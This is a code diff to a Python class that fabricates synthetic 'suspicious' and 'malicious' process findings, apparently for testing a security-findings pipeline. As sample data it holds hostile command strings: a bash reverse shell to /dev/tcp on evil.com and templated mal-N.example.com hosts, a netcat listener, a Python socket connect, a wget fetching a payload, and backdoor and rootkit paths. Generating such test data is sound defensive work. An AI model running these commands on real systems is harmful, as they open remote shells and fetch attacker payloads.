@@ -114,16 +114,22 @@ class ProcessProducer(AggregatingProducer):
 
     def _generate_suspicious_process(self, index: int) -> Dict[str, Any]:
         """Generate a suspicious process finding."""
-        suspicious_commands = [
-            "/usr/bin/nc -l 4444", "/usr/bin/python3 -c 'import socket'",
-            "/bin/bash -i >& /dev/tcp/evil.com/8080", "/usr/bin/wget http://suspicious.com"
+        from .augmentation_utils import random_username, unique_token, perturb_text
+
+        suspicious_templates = [
+            "/usr/bin/nc -l {port}", "/usr/bin/python3 -c 'import socket; s.connect(({host},{port}))'",
+            "/bin/bash -i >& /dev/tcp/{host}/{port}", "/usr/bin/wget http://{host}/payload"
         ]
-        command = random.choice(suspicious_commands)
+        host = f"mal-{random.randint(1,999)}.example.com"
+        port = random.randint(1024, 65535)
+        command = random.choice(suspicious_templates).format(host=host, port=port)
         pid = random.randint(10000, 20000)
 
+        title = perturb_text("Suspicious process detected")
+
         return self._generate_base_finding(
-            finding_id=f"proc_susp_{pid}_{index}",
-            title="Suspicious process detected",
+            finding_id=f"proc_susp_{pid}_{index}_{unique_token()}",
+            title=title,
             severity="medium",
             risk_score=50,
             base_severity_score=50,
@@ -131,7 +137,7 @@ class ProcessProducer(AggregatingProducer):
             metadata={
                 "pid": pid,
                 "command": command,
-                "user": "www-data" if random.random() < 0.5 else "user",
+                "user": random.choice([random_username(), "www-data", "nobody"]),
                 "state": "R (running)",
                 "ppid": random.randint(1, 1000),
                 "pattern_match": True,
@@ -141,16 +147,23 @@ class ProcessProducer(AggregatingProducer):
 
     def _generate_malicious_process(self, index: int) -> Dict[str, Any]:
         """Generate a malicious process finding."""
-        malicious_commands = [
-            "/tmp/.evil/malware --daemon", "/var/tmp/backdoor -p 1337",
-            "/home/user/.config/.malware", "/usr/local/bin/rootkit"
+        from .augmentation_utils import unique_token, random_username, perturb_text
+
+        malicious_templates = [
+            "/tmp/.evil/{token} --daemon", "/var/tmp/backdoor -p {port}",
+            "/home/{user}/.config/{token}", "/usr/local/bin/{token}"
         ]
-        command = random.choice(malicious_commands)
+        token = unique_token('mal')
+        port = random.choice([1337, 4444, 5555, random.randint(2000,65000)])
+        user = random.choice([random_username(), 'root'])
+        command = random.choice(malicious_templates).format(token=token, port=port, user=user)
         pid = random.randint(20000, 30000)
 
+        title = perturb_text("Malicious process detected")
+
         return self._generate_base_finding(
-            finding_id=f"proc_mal_{pid}_{index}",
-            title="Malicious process detected",
+            finding_id=f"proc_mal_{pid}_{index}_{token}",
+            title=title,
             severity="high",
             risk_score=80,
             base_severity_score=80,
@@ -158,7 +171,7 @@ class ProcessProducer(AggregatingProducer):
             metadata={
                 "pid": pid,
                 "command": command,
-                "user": "root",
+                "user": user,
                 "state": "R (running)",
                 "ppid": 1,
                 "deleted_executable": True,
